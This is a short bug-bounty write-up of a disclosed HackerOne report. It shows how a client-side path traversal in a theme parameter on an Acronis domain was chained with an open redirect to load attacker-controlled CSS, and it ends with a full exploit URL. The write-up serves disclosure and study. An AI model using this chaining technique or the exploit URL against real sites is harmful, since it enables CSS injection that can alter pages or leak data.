# Client-Side Path Traversal

### Client Side Path Traversal + Open Redirect leads CSS Injection
- Link: https://hackerone.com/reports/1245165
#### **Description:**
Finding the Client-Side Path Traversal: 
1. Analysing the JavaScript code we can notice that the `color_scheme` parameter (`https://mc-beta-cloud.acronis.com/mc/?color_scheme=PARAMETER`) was being taked to generate a new GET request to `https://mc-beta-cloud.acronis.com/mc/theme.PARAMETER.css`.
2. Since the front end doesn't sanitize the values `.` and `/`its possible to perform a path traversal to request the CSS file from other path. For example, if you go to: `https://mc-beta-cloud.acronis.com/mc/?color_scheme=%2F..%2F..%2FPARAMETER` you will notice a GET request is being made to the following URL, confirming the Relative Path Overwrite issue: `https://mc-beta-cloud.acronis.com/PARAMETER.css?v=24.0.10942`
Finding the Open Redirect:
1. Notice the state GET parameter is controllable by the user so we can specify any external domain where to redirect the user. `https://mc-beta-cloud.acronis.com/api/2/idp/authorize/?client_id=fb2bf44e-ac14-444a-b2a9-e5e81fe73b80&redirect_uri=%2Fhci%2Fcallback&response_type=code&scope=openid&state=http://localhost&nonce=bhgjuvrrvpwauibleqhvfqat`.
Combining both
1. Once we confirmed the Relative Path Overwrite and Open Redirect let's put it all together to make the exploit
```
https://mc-beta-cloud.acronis.com/mc/?color_sheme=%2F..%2F..%2F..%2Fapi%2F2%2Fidp%2Fauthorize%2F%3Fclient_id%3Dfb2bf44e-ac14-444a-b2a9-e5e81fe73b80%26redirect_uri%3D%252Fhci%252Fcallback%26response_type%3Dcode%26scope%3Dopenid%26state%3Dhttp%253A%252F%252Flocalhost%252Fcss%252Fcore.css%26nonce%3Dbhgjuvrrvpwauibleqhvfqat
```
